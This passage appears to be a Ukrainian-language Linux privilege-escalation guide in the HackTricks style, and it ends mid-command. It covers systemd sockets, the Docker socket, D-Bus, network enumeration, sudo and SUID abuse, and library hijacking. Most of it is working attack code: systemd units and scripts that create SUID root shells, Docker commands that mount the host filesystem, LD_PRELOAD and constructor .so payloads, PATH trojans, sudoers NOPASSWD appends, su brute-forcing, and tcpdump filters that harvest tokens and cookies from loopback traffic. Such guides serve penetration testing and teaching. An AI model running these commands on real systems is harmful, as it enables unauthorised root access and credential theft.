- `Service`: Вказує ім'я **service** unit, яке потрібно **активувати** при **вхідному трафіку**. Ця опція дозволена тільки для сокетів з `Accept=no`. За замовчуванням береться service з тим самим іменем, що й сокет (с з заміненим суфіксом). У більшості випадків використання цієї опції не є необхідним.

### Записувані `.socket` файли

Якщо ви знаходите **записуваний** файл `.socket`, ви можете **додати** на початку секції `[Socket]` щось на кшталт: `ExecStartPre=/home/kali/sys/backdoor` і backdoor буде виконано перед тим, як сокет буде створено. Тому вам **ймовірно потрібно буде почекати, поки машина не перезавантажать.**\
_Note that the system must be using that socket file configuration or the backdoor won't be executed_

### Активація сокета + записуваний шлях unit (створення відсутньої служби)

Інша помилка з високим впливом:

- сокет unit з `Accept=no` і `Service=<name>.service`
- посиланий service unit відсутній
- атакуючий може записувати в `/etc/systemd/system` (або інший шлях пошуку unit)

У такому разі атакуючий може створити `<name>.service`, а потім спричинити трафік до сокета, щоб systemd завантажив і виконав нову service як root.

Короткий сценарій:
```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```
### Записувані sockets

Якщо ви **виявите будь-який writable socket** (_тут ми говоримо про Unix Sockets і не про конфігураційні файли `.socket`_), то **ви зможете спілкуватися** з цим socket'ом і, можливо, експлуатувати вразливість.

### Перелічити Unix Sockets
```bash
netstat -a -p --unix
```
### Необроблене з'єднання
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation example:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Зверніть увагу, що можуть бути деякі **sockets listening for HTTP** (_я не говорю про .socket files, а про файли, що виконують роль unix sockets_). Ви можете перевірити це за допомогою:
```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```
Якщо сокет **responds with an HTTP** request, то ви можете **communicate** з ним і, можливо, **exploit some vulnerability**.

### Docker socket, доступний для запису

The Docker socket, який часто знаходиться за шляхом `/var/run/docker.sock`, є критичним файлом, який слід захистити. За замовчуванням він доступний для запису користувачу `root` та членам групи `docker`. Наявність права запису в цей socket може призвести до Privilege Escalation. Нижче наведено розбір того, як це можна зробити, та альтернативні методи, якщо Docker CLI недоступний.

#### **Privilege Escalation with Docker CLI**

Якщо у вас є права запису до Docker socket, ви можете escalate privileges, використовуючи такі команди:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Ці команди дозволяють запустити container з root-доступом до файлової системи хоста.

#### **Використання Docker API безпосередньо**

Якщо Docker CLI недоступний, Docker socket все ще можна маніпулювати через Docker API та команди `curl`.

1.  **List Docker Images:** Отримайте список доступних Docker images.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Надішліть запит на створення container, який монтує кореневу директорію системи хоста.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Запустіть щойно створений container:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Використайте `socat` для встановлення з'єднання з container, що дозволяє виконувати команди всередині нього.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Після налаштування з'єднання `socat` ви можете виконувати команди безпосередньо в container з root-доступом до файлової системи хоста.

### Інше

Зауважте, що якщо у вас є права запису на docker socket, тому що ви **inside the group `docker`** you have [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group). Якщо the [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Перегляньте **more ways to break out from containers or abuse container runtimes to escalate privileges** у:


{{#ref}}
container-security/
{{#endref}}

## Containerd (ctr) privilege escalation

Якщо ви можете використовувати команду **`ctr`**, прочитайте наступну сторінку, оскільки **you may be able to abuse it to escalate privileges**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

Якщо ви можете використовувати команду **`runc`**, прочитайте наступну сторінку, оскільки **you may be able to abuse it to escalate privileges**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus — це потужна **inter-Process Communication (IPC) system**, яка дозволяє застосункам ефективно взаємодіяти та обмінюватися даними. Розроблена з урахуванням сучасних Linux-систем, вона пропонує надійну основу для різних форм комунікації між застосунками.

Система є універсальною, підтримуючи базову IPC, яка покращує обмін даними між процесами, нагадуючи **enhanced UNIX domain sockets**. Крім того, вона допомагає транслювати події або сигнали, сприяючи безшовній інтеграції компонентів системи. Наприклад, сигнал від Bluetooth-демона про вхідний дзвінок може змусити програвач музики приглушити звук, покращуючи взаємодію з користувачем. Додатково, D-Bus підтримує систему віддалених об'єктів, спрощуючи запити сервісів і виклики методів між застосунками, оптимізуючи процеси, які раніше були складними.

D-Bus працює за **allow/deny model**, керуючи дозволами на повідомлення (виклики методів, емісії сигналів тощо) на основі кумулятивного ефекту відповідних правил політики. Ці політики визначають взаємодії з шиною (bus), потенційно дозволяючи privilege escalation через експлуатацію таких дозволів.

Наведено приклад такої політики в `/etc/dbus-1/system.d/wpa_supplicant.conf`, що деталізує дозволи для користувача root на володіння, відправлення та отримання повідомлень від `fi.w1.wpa_supplicant1`.

Політики без вказаного користувача або групи застосовуються глобально, тоді як політики в контексті "default" застосовуються до всіх, хто не охоплений іншими конкретними політиками.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Дізнайтеся, як enumerate і exploit D-Bus communication тут:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Мережа**

Завжди цікаво enumerate мережу й визначити позицію машини.

### Загальна enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```
### Швидка діагностика фільтрації вихідного трафіку

Якщо на хості можна виконувати команди, але callbacks не проходять, швидко відокремте фільтрацію DNS, transport, proxy та route:
```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```
### Open ports

Завжди перевіряйте мережеві сервіси, що працюють на машині, з якими ви не могли взаємодіяти до отримання доступу:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```
Classify listeners by bind target:

- `0.0.0.0` / `[::]`: доступний на всіх локальних інтерфейсах.
- `127.0.0.1` / `::1`: лише локальні (хороші кандидати для tunnel/forward).
- Specific internal IPs (e.g. `10.x`, `172.16/12`, `192.168.x`, `fe80::`): зазвичай доступні лише з внутрішніх сегментів.

### Процес триажу локальних сервісів

Коли ви отримуєте контроль над хостом, сервіси, прив'язані до `127.0.0.1`, часто вперше стають доступними з вашого shell. Швидкий локальний робочий процес:
```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```
### LinPEAS як мережевий сканер (network-only mode)

Окрім локальних перевірок PE, linPEAS може працювати як спеціалізований мережевий сканер. Він використовує доступні бінарні файли в `$PATH` (зазвичай `fping`, `ping`, `nc`, `ncat`) і не встановлює додаткових інструментів.
```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```
Якщо ви передасте `-d`, `-p` або `-i` без `-t`, linPEAS поводиться як чистий network scanner (пропускаючи решту privilege-escalation checks).

### Sniffing

Перевірте, чи можете ви sniff traffic. Якщо так, ви зможете отримати деякі credentials.
```
timeout 1 tcpdump
```
Швидкі практичні перевірки:
```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```
Loopback (`lo`) особливо цінний у post-exploitation, оскільки багато внутрішніх сервісів, доступних лише локально, там видають tokens/cookies/credentials:
```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
| egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```
Захопіть зараз, аналізуйте пізніше:
```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
-T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```
## Користувачі

### Generic Enumeration

Перевірте, **who** ви є, які **privileges** у вас є, які **users** є в системі, які можуть **login** і які мають **root privileges:**
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Великий UID

Деякі версії Linux постраждали від помилки, яка дозволяє користувачам з **UID > INT_MAX** підвищувати привілеї. Більше інформації: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Експлуатувати** за допомогою: **`systemd-run -t /bin/bash`**

### Групи

Перевірте, чи ви є **членом якоїсь групи**, яка може надати вам root privileges:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Буфер обміну

Перевірте, чи в буфері обміну є щось цікаве (якщо можливо)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Політика паролів
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Відомі паролі

Якщо ви **знаєте будь-який пароль** середовища, **спробуйте увійти під кожним користувачем**, використавши цей пароль.

### Su Brute

Якщо вас не бентежить створення великого шуму і бінарні файли `su` та `timeout` присутні на комп'ютері, ви можете спробувати brute-force користувача за допомогою [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) з параметром `-a` також намагається brute-force користувачів.

## Зловживання записуваним $PATH

### $PATH

Якщо ви виявите, що можете **записувати в якийсь каталог із $PATH**, це може дозволити ескалацію привілеїв шляхом **створення backdoor у записуваному каталозі** з ім'ям деякої команди, яка буде виконана іншим користувачем (бажано root) і яка **не завантажується з каталогу, що стоїть раніше** вашого записуваного каталогу в $PATH.

### SUDO and SUID

Вам може бути дозволено виконувати певні команди через sudo або деякі бінарники можуть мати suid bit. Перевірте це за допомогою:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Деякі **неочікувані команди дозволяють читати та/або записувати файли або навіть виконувати команду.** Наприклад:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Конфігурація Sudo може дозволяти користувачу виконувати певну команду з привілеями іншого користувача без знання пароля.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
У цьому прикладі користувач `demo` може запускати `vim` як `root`, тепер досить просто отримати shell, додавши ssh key у кореневий каталог або викликавши `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Ця директива дозволяє користувачу **встановити змінну середовища** під час виконання чогось:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Цей приклад, **на основі HTB machine Admirer**, був **вразливий** до **PYTHONPATH hijacking**, що дозволяв завантажити довільну python бібліотеку під час виконання скрипта як root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV збережено через sudo env_keep → root shell

Якщо sudoers зберігає `BASH_ENV` (наприклад, `Defaults env_keep+="ENV BASH_ENV"`), ви можете скористатися неінтерактивною поведінкою запуску Bash, щоб виконати довільний код як root при виклику дозволеної команди.

- Чому це працює: Для неінтерактивних shell Bash оцінює `$BASH_ENV` і підключає цей файл перед запуском цільового скрипта. Багато правил sudo дозволяють запускати скрипт або shell-обгортку. Якщо `BASH_ENV` збережено sudo, ваш файл підключається з привілеями root.

- Вимоги:
- Правило sudo, яке ви можете виконати (будь-яка ціль, що викликає `/bin/bash` неінтерактивно, або будь-який bash script).
- `BASH_ENV` присутній у `env_keep` (перевірте за допомогою `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Жорстке укріплення:
- Видаліть `BASH_ENV` (та `ENV`) з `env_keep`, віддавайте перевагу `env_reset`.
- Уникайте shell wrappers для sudo-allowed команд; використовуйте мінімальні бінарні файли.
- Розгляньте sudo I/O logging і alerting при використанні preserved env vars.

### Terraform через sudo із збереженим HOME (!env_reset)

Якщо sudo залишає середовище незайманим (`!env_reset`) і дозволяє виконання `terraform apply`, `$HOME` залишається каталогом викликаючого користувача. Тому Terraform завантажує **$HOME/.terraformrc** як root і поважає `provider_installation.dev_overrides`.

- Вкажіть необхідний provider у каталозі з правами запису і помістіть шкідливий плагін, названий ім'ям провайдера (наприклад, `terraform-provider-examples`):
```hcl
# ~/.terraformrc
provider_installation {
dev_overrides {
"previous.htb/terraform/examples" = "/dev/shm"
}
direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```
Terraform провалить Go plugin handshake, але виконає payload від імені root перед завершенням, залишаючи по собі SUID shell.

### TF_VAR overrides + symlink validation bypass

Змінні Terraform можна передавати через змінні оточення `TF_VAR_<name>`, які зберігаються, коли sudo зберігає оточення. Слабкі валідації, такі як `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")`, можна обійти за допомогою symlinks:
```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```
Terraform розв'язує symlink і копіює справжній `/root/root.txt` у attacker-readable destination. Такий же підхід можна використати для **write** у привілейовані шляхи, попередньо створивши destination symlinks (наприклад, вказавши provider’s destination path всередині `/etc/cron.d/`).

### requiretty / !requiretty

У деяких старіших дистрибутивах sudo може бути налаштовано з `requiretty`, що змушує sudo виконуватися лише з інтерактивного TTY. Якщо встановлено `!requiretty` (або опція відсутня), sudo можна запускати з неінтерактивних контекстів, таких як reverse shells, cron jobs або скрипти.
```bash
Defaults !requiretty
```
This is not a direct vulnerability by itself, but it expands the situations where sudo rules can be abused without needing a full PTY.

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

Якщо `sudo -l` показує `env_keep+=PATH` або `secure_path`, який містить записи, доступні для запису атакуючому (наприклад, `/home/<user>/bin`), будь-яку відносну команду всередині дозволеної sudo цілі можна перекрити.

- Вимоги: правило sudo (часто `NOPASSWD`), яке запускає скрипт/бінарник, що викликає команди без абсолютних шляхів (`free`, `df`, `ps` тощо), і запис у PATH, доступний для запису, який перевіряється першим.
```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```
### Sudo — обхід шляхів виконання
**Перейти** щоб прочитати інші файли або використовувати **symlinks**. Наприклад, у файлі sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Якщо використовується **wildcard** (\*), це ще простіше:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Контрзаходи**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary без шляху до команди

Якщо користувачу надано **дозвіл sudo** лише для однієї команди **без вказання шляху**: _hacker10 ALL= (root) less_, ви можете скористатися цим, змінивши змінну PATH.
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Цю техніку також можна застосувати, якщо **suid** binary **виконує іншу команду, не вказуючи шлях до неї (завжди перевіряйте за допомогою** _**strings**_ **вміст дивного SUID binary)**).

[Payload examples to execute.](payloads-to-execute.md)

### SUID binary із вказаним шляхом до команди

Якщо **suid** binary **виконує іншу команду з вказаним шляхом**, тоді ви можете спробувати **export a function** з іменем тієї команди, яку викликає suid-файл.

Наприклад, якщо suid binary викликає _**/usr/sbin/service apache2 start**_ ви маєте спробувати створити функцію та експортувати її:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Тоді, коли ви викликаєте suid binary, ця функція буде виконана

### script, доступний для запису, що виконується SUID wrapper

Типова помилка налаштування custom-app — root-owned SUID binary wrapper, що виконує script, тоді як сам script доступний для запису low-priv users.

Типовий шаблон:
```c
int main(void) {
system("/bin/bash /usr/local/bin/backup.sh");
}
```
Якщо `/usr/local/bin/backup.sh` доступний для запису, ви можете дописати команди payload, а потім виконати SUID wrapper:
```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```
Швидкі перевірки:
```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```
Цей шлях атаки особливо поширений у "maintenance"/"backup" wrappers, що встановлюються в `/usr/local/bin`.

### LD_PRELOAD & **LD_LIBRARY_PATH**

Змінна середовища **LD_PRELOAD** використовується для вказівки однієї або кількох спільних бібліотек (.so файлів), які завантажуються завантажувачем перед усіма іншими, включно зі стандартною бібліотекою C (`libc.so`). Цей процес відомий як попереднє завантаження бібліотеки.

Однак, для підтримки безпеки системи та запобігання експлуатації цієї можливості, особливо щодо **suid/sgid** виконуваних файлів, система накладає певні обмеження:

- Завантажувач ігнорує **LD_PRELOAD** для виконуваних файлів, де реальний ідентифікатор користувача (_ruid_) не збігається з ефективним ідентифікатором користувача (_euid_).
- Для виконуваних файлів зі suid/sgid передзавантажуються лише бібліотеки зі стандартних шляхів, які самі мають suid/sgid.

Ескалація привілеїв може відбутися, якщо ви маєте можливість виконувати команди з `sudo` і вивід `sudo -l` містить рядок **env_keep+=LD_PRELOAD**. Така конфігурація дозволяє змінній середовища **LD_PRELOAD** зберігатися і розпізнаватися навіть при запуску команд через `sudo`, що потенційно може призвести до виконання довільного коду з підвищеними привілеями.
```
Defaults        env_keep += LD_PRELOAD
```
Збережіть як **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Потім **скомпілюйте це** використовуючи:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Нарешті, **escalate privileges** запустивши
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Зловживання подібним privesc можливе, якщо нападник контролює **LD_LIBRARY_PATH** env variable, оскільки він контролює шлях, у якому будуть шукатися бібліотеки.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Якщо натрапили на бінарний файл з правами **SUID**, який виглядає підозрілим, хорошою практикою є перевірити, чи він правильно завантажує **.so** файли. Це можна перевірити, виконавши наступну команду:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Наприклад, зіткнення з помилкою на кшталт _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ вказує на потенційну можливість експлуатації.

Щоб експлуатувати це, слід створити C-файл, скажімо _"/path/to/.config/libcalc.c"_, який містить наступний код:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Цей код, після компіляції та виконання, має на меті elevate privileges шляхом маніпулювання file permissions та запуску shell з elevated privileges.

Скомпілюйте наведений вище C файл у shared object (.so) файл за допомогою:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Нарешті, запуск уразливого SUID бінарного файлу має спровокувати експлойт і може призвести до компрометації системи.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Тепер, коли ми знайшли SUID binary, який завантажує бібліотеку з папки, в яку ми можемо записувати, створімо бібліотеку в цій папці з потрібною назвою:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Якщо ви отримуєте помилку, таку як
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
це означає, що згенерована вами бібліотека повинна містити функцію з назвою `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) — це відбірний список Unix-бінарів, які може експлуатувати атакуючий, щоб обійти локальні обмеження безпеки. [**GTFOArgs**](https://gtfoargs.github.io/) — те ж саме, але для випадків, коли ви можете **лише інжектити аргументи** в команду.

Проєкт збирає легітимні функції Unix-бінарів, які можна зловживати для виходу з обмежених shell, ескалації або підтримки підвищених привілеїв, передачі файлів, створення bind та reverse shells, а також полегшення інших post-exploitation завдань.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Якщо ви маєте доступ до `sudo -l`, ви можете використати інструмент [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) щоб перевірити, чи він знаходить спосіб експлуатувати будь-яке правило sudo.

### Reusing Sudo Tokens

У випадках, коли у вас є **sudo access** але немає пароля, ви можете ескалювати привілеї, **чекаючи виконання команди sudo і перехопивши сесійний токен**.

Вимоги для ескалації привілеїв:

- Ви вже маєте shell як користувач _sampleuser_
- _sampleuser_ використав **`sudo`** для виконання чогось за **останні 15 хвилин** (за замовчуванням це тривалість sudo token, що дозволяє нам використовувати `sudo` без введення пароля)
- `cat /proc/sys/kernel/yama/ptrace_scope` має значення 0
- `gdb` доступний (ви можете його завантажити на систему)

(Ви можете тимчасово встановити `ptrace_scope` командою `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` або постійно змінивши `/etc/sysctl.d/10-ptrace.conf` і встановивши `kernel.yama.ptrace_scope = 0`)

Якщо всі ці вимоги виконані, **ви можете підвищити привілеї, використавши:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- The **first exploit** (`exploit.sh`) will create the binary `activate_sudo_token` in _/tmp_. You can use it to **activate the sudo token in your session** (you won't get automatically a root shell, do `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- Другий **exploit** (`exploit_v2.sh`) створить sh shell у _/tmp_, який **буде належати root і матиме setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **третій exploit** (`exploit_v3.sh`) **створить sudoers file**, який робить **sudo tokens вічними і дозволяє всім користувачам використовувати sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Якщо у вас є **права на запис** у папці або на будь-якому зі створених у ній файлів, ви можете використати бінарний файл [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) щоб **створити sudo token для користувача та PID**.\
Наприклад, якщо ви можете перезаписати файл _/var/run/sudo/ts/sampleuser_ і у вас є shell під цим користувачем з PID 1234, ви можете **отримати sudo-привілеї** без необхідності знати пароль, виконавши:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Файл `/etc/sudoers` та файли всередині `/etc/sudoers.d` налаштовують, хто може використовувати `sudo` і як. Ці файли **за замовчуванням можуть читатися лише користувачем root та групою root**.\
**Якщо** ви можете **прочитати** цей файл, ви зможете **отримати деяку цікаву інформацію**, а якщо ви можете **записати** будь-який файл, ви зможете **escalate privileges**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Якщо у вас є права на запис, ви можете зловживати цим дозволом
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Ще один спосіб зловживати цими дозволами:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
